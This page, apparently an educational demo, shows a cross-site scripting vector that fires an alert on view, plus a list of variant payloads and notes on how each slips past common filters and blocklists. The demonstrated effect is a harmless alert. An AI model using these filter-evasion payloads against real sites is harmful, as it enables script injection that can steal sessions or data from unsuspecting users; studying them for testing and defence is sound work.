Advanced XSS — fires on view

The only effect of this page is a benign alert('Hello from x8bitranjit'). Below is the exact vector and why it defeats common filters.

The vector it just fired

<img src=x onerror=alert`Hello from x8bitranjit`>

Injected via element.innerHTML. Two expert details make it land where a naive payload wouldn't:

TechniqueWhy it beats the filter
<img onerror> (not <script>) <script> inserted through innerHTML never executes. A broken <img> does — its onerror fires during parsing. This is the canonical innerHTML-executable primitive.
tagged template alert`…` An ES6 tagged-template call invokes the function with no () — it slips past blocklists keyed on alert( or on parentheses entirely.
no quotes needed on src=x Unquoted attribute value avoids "/' filters; x is an invalid URL so the load fails instantly and deterministically.

Expert variants (same benign payload, different sink/filter)

<svg/onload=alert('Hello from x8bitranjit')>                      <!-- direct DOM insert / SVG context -->
<details open ontoggle=alert('Hello from x8bitranjit')>             <!-- no img/svg needed -->
<marquee onstart=alert('Hello from x8bitranjit')>                  <!-- legacy handler, still fires -->
<iframe srcdoc="&lt;img src=x onerror=alert('Hello from x8bitranjit')&gt;">   <!-- nested-document escape -->
<img src onerror=alert&#40;'Hello from x8bitranjit'&#41;>            <!-- HTML-entity-encoded parens -->
[]["constructor"]["constructor"]("alert('Hello from x8bitranjit')")()  <!-- eval-less, no literal 'alert(' in source -->
Benign & self-contained. This page accepts no user input, reflects nothing from the URL, and reaches no other origin — so it cannot be repurposed as an open reflector. It exists to demonstrate the vectors, for education and authorized testing only.
